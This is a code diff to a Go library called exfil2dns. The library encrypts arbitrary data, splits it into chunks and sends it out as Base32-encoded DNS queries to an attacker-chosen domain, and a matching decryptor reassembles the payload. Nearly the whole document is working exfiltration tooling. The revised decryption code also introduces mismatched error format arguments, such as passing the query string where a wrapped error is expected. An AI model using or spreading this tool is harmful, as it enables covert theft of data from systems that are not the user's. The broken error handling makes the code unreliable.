@@ -29,8 +29,11 @@
 //	)
 //
 //	func main() {
-//		/* Target Name: cube, Domain: example.domain, Key: ThisIsAKey1234, Chunk Size: 23 */
-//		client, err := exfil2dns.NewClient("cube", "example.domain", "ThisIsAKey1234", 23)
+//		client, err := exfil2dns.NewClient(
+//			"cube", 
+//			"example.domain", 
+//			"ThisIsAKey1234", 23)
+//		
 //		if err != nil {
 //			log.Fatal("Error creating client: " + err.Error())
 //		}
@@ -57,75 +60,94 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"log"
 	"net"
 	"strings"
 
 	"golang.org/x/crypto/nacl/secretbox"
 )
 
-type (
-	// Client contains the parameters to required to encrypt and deliver the
-	// payload. Use NewClient() to initialize.
-	Client struct {
-		target, domain, server string
-		key                    [32]byte
-		chunkSize              int
-	}
-
-	// Decryptor contains the parameters required to decrypt messages from the
-	// exfil client. Use NewDecryptor() to initialize.
-	Decryptor struct {
-		key [32]byte
-	}
-)
-
 /* Initialize Base32 encoder */
 var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)
 
-// NewClient initializes Client and returns a pointer to it.
+var (
+	// MaxChunk is the largest size (in bytes) a chunk can be
+	MaxChunk = 23
+	// MaxQueryLength is the longest a DNS query string (between the ".")
+	MaxQueryLength = 63
+)
+
+
+// Client contains the parameters to required to encrypt and deliver the
+// payload. Use NewClient() to initialize.
+type Client struct {
+	target, domain, server, format string
+	key                    [32]byte
+	chunkSize              int
+}
+
+// NewClient initializes the Client
 // Target is the name of the target system. Domain is the domain to append to
-// the query string. Password is the key for secretbox (SHA256 hashed). Chunk
-// size is the max number of payload bytes per message, must be <24.
-func NewClient(
-	target, domain, password string,
-	chunkSize int,
-) (*Client, error) {
+// the query string. Chunk size is the max number of payload bytes per message, 
+// must be <= 23.
+func NewClient(target, domain, password string, chunkSize int) (Client, error) {
 	return NewDevClient(target, domain, password, "", chunkSize)
 }
 
-// NewDevClient initializes Client with an optional DNS server address and
-// returns a pointer to it. Target is the name of the target system (Base32
-// encoded). Domain is the domain to append to the query string. Password is the
-// key for secretbox (SHA256 hashed). Chunk size is the max number of payload
-// bytes per message, must be <24.
-func NewDevClient(
-	target, domain, password, server string,
-	chunkSize int,
-) (*Client, error) {
+// NewDevClient functions the same as NewClient, but sends all DNS requests to a
+// custom DNS server (overriding the system's DNS resolver).
+func NewDevClient(target, domain, password, server string, chunkSize int) (Client, error) {
 	if chunkSize > 23 {
-		return &Client{},
-			fmt.Errorf("chunk size cannot be greater than 23. Got: %v", chunkSize)
+		return Client{},
+			fmt.Errorf(
+				"chunk size %v larger than max chunk size of %v", 
+				chunkSize, MaxChunk,
+			)
 	}
 
-	return &Client{
-		target:    b32.EncodeToString([]byte(target)),
+	encodedT := b32.EncodeToString([]byte(target))
+	if len(encodedT) > MaxQueryLength {
+		return Client{}, fmt.Errorf(
+			"target name %v longer than max length of %d", 
+			target, MaxQueryLength,
+		)
+	}
+
+	if len(domain) > 63 {
+		return Client{}, fmt.Errorf(
+			"domain name %v longer than max length of %d",
+			domain, MaxQueryLength,
+		)
+	}
+
+	format := "%s.%s.%s.%s."
+	if len(domain) == 0 {
+		format = "%s.%s.%s."
+	}
+
+	return Client{
+		target:    encodedT,
 		domain:    domain,
 		key:       sha256.Sum256([]byte(password)),
 		server:    server,
+		format:    format,
 		chunkSize: chunkSize,
 	}, nil
 }
 
-// NewDecryptor initializes Server and returs a pointer to it.
-// Password is hashed with SHA256.
-func NewDecryptor(password string) *Decryptor {
-	return &Decryptor{
+// Decryptor contains the parameters required to decrypt messages from the
+// exfil client. Use NewDecryptor() to initialize.
+type Decryptor struct {
+	key [32]byte
+}
+
+// NewDecryptor initializes Decryptor
+func NewDecryptor(password string) Decryptor {
+	return Decryptor{
 		key: sha256.Sum256([]byte(password)),
 	}
 }
 
-// ExfilString takes a string payload converts it to a byte slice and exfils.
+// ExfilString takes a string payload and exfils.
 func (c *Client) ExfilString(payload string) error {
 	return c.Exfil([]byte(payload))
 }
@@ -138,57 +160,70 @@ func (c *Client) Exfil(payload []byte) error {
 	in := bytes.NewReader(payload)
 	chunk := make([]byte, c.chunkSize)
 	for {
-		l, err := in.Read(chunk)
-		if l != 0 {
-			/* Encode and query the DNS server */
-			q, err := c.Send(c.Encode(chunk[:l]))
+		n, err := in.Read(chunk)
+		if n != 0 {
+			/* Encode chunk as query */
+			e, err := c.Encode(chunk[:n])
 			if err != nil {
-				return fmt.Errorf("unable to query: %s. %v", q, err)
+				return fmt.Errorf("unable to encode chunk. %v", err)
+			}
+
+			/* Send query */
+			q, err := c.send(e)
+			if err != nil {
+				return fmt.Errorf("unable to query: %s. %w", q, err)
 			}
 		}
 		if errors.Is(err, io.EOF) {
 			break
 		}
 		if err != nil {
-			return fmt.Errorf("payload read error: %v", err)
+			return fmt.Errorf("payload read error: %w", err)
 		}
 	}
 	return nil
 }
 
-// Encode takes a chunk and encrypts it with secretbox and builds a query. Each
-// time encode is called, a unique nonce is created. If something breaks here
-// a log.Fatal() is called, as whatever broke will also cause other problems.
-func (c *Client) Encode(chunk []byte) string {
+// Encode takes a chunk of data, encrypts it, and returns a query
+func (c *Client) Encode(chunk []byte) (string, error) {
 	if len(chunk) > c.chunkSize {
-		log.Fatalf("chunk too large, have %d, want %d", len(chunk), c.chunkSize)
+		return "", fmt.Errorf(
+			"chunk too large, have %d, want %d", len(chunk), c.chunkSize,
+		)
 	}
 
 	/* Generate nonce */
 	var nonce [24]byte
 	if _, err := rand.Read(nonce[:]); nil != err {
-		log.Fatalf("unable to get nonce: %v", err)
+		return "", fmt.Errorf("unable to get nonce: %w", err)
 	}
 
 	/* Encrypt chunk */
-	encryptedBytes := secretbox.Seal([]byte{}, chunk, &nonce, &c.key)
+	encryptedBytes := b32.EncodeToString(
+		secretbox.Seal([]byte{}, chunk, &nonce, &c.key),
+	)
+	if len(encryptedBytes) > MaxQueryLength {
+		return "", fmt.Errorf(
+			"encrypted payload longer than max length of %d", MaxQueryLength,
+		)
+	}
 
 	return strings.ToLower(fmt.Sprintf(
-		"%s.%s.%s.%s.",
-		b32.EncodeToString(encryptedBytes),
+		c.format,
+		encryptedBytes,
 		c.target,
 		b32.EncodeToString(nonce[:]),
 		c.domain),
-	)
+	), nil
 }
 
-// Send takes a query string and queries the system's DNS resolver. No input
+// send takes a query string and queries the system's DNS resolver. No input
 // validation is performed here. When calling this function directly, use at
 // your own risk.
 // Note: For development, it is possible to specify a custom DNS server when
 // initializing the client, however this implementation is considered a hack and
 // shouldn't be relied on.
-func (c *Client) Send(query string) (string, error) {
+func (c *Client) send(query string) (string, error) {
 	var resolver *net.Resolver
 
 	/* If a custom DNS server is specified, use it (Development/Testing) */
@@ -208,45 +243,50 @@ func (c *Client) Send(query string) (string, error) {
 	_, err := resolver.LookupIPAddr(context.Background(), query)
 	var de *net.DNSError
 	if err != nil && !(errors.As(err, &de) && de.IsNotFound) {
-		return "", fmt.Errorf("error resolving %s: %v", query, err)
+		return "", fmt.Errorf("error resolving %s: %w", query, err)
 	}
 	return query, nil
 }
 
-// Decode takes a query string recieved and returns a 2 element string slice.
+// Decrypt takes a query string recieved and returns a 2 element string slice.
 // Index 0 is the name of the target recieved and index 1 is the payload.
-func (d *Decryptor) Decode(query string) ([2]string, error) {
+func (d *Decryptor) Decrypt(query string) (string, string, error) {
 	/* Convert query string to upper case and split into the first 4 parts */
 	parts := strings.SplitN(strings.ToUpper(query), ".", 4)
-	if len(parts) < 4 {
-		return [2]string{}, fmt.Errorf("[%s] Not enough parts to query")
+	if len(parts) < 3 {
+		return "", "", fmt.Errorf("not enough parts to query")
 	}
 
 	/* Decode payload */
 	payload, err := b32.DecodeString(parts[0])
 	if err != nil {
-		return [2]string{},
-			fmt.Errorf("[%s] Error decoding payload: %v", query, err)
+		return "", "",
+			fmt.Errorf("error decoding payload: %w", query, err)
 	}
 
 	/* Decode target */
 	target, err := b32.DecodeString(parts[1])
 	if err != nil {
-		return [2]string{},
-			fmt.Errorf("[%s] Error decoding target: %v", query, err)
+		return "", "",
+			fmt.Errorf("error decoding target: %w", query, err)
 	}
 
-	/* Decode and verify nonce */
+	/* Verify Nonce */
 	var nonce [24]byte
+	if b32.DecodedLen(len(parts[2])) > len(nonce) {
+		return "", "", fmt.Errorf("nonce too long", query)
+	}
+
+	/* Nonce */
 	l, err := b32.Decode(nonce[:], []byte(parts[2]))
 	if err != nil {
-		return [2]string{},
-			fmt.Errorf("[%s] Error decoding nonce: %v", query, err)
+		return "", "",
+			fmt.Errorf("error decoding nonce: %w", query, err)
 	}
 
 	if l != len(nonce) {
-		return [2]string{}, fmt.Errorf(
-			"[%s] Error reading nonce, have %d bytes, want %d",
+		return "", "", fmt.Errorf(
+			"error reading nonce, have %d bytes, want %d",
 			query,
 			l,
 			len(nonce),
@@ -256,7 +296,7 @@ func (d *Decryptor) Decode(query string) ([2]string, error) {
 	/* Decrypt payload */
 	decrypted, ok := secretbox.Open([]byte{}, payload, &nonce, &d.key)
 	if !ok {
-		return [2]string{}, fmt.Errorf("[%s] Error decrypting payload", query)
+		return "", "", fmt.Errorf("error decrypting payload", query)
 	}
-	return [2]string{string(target), string(decrypted)}, nil
+	return string(target), string(decrypted), nil
 }
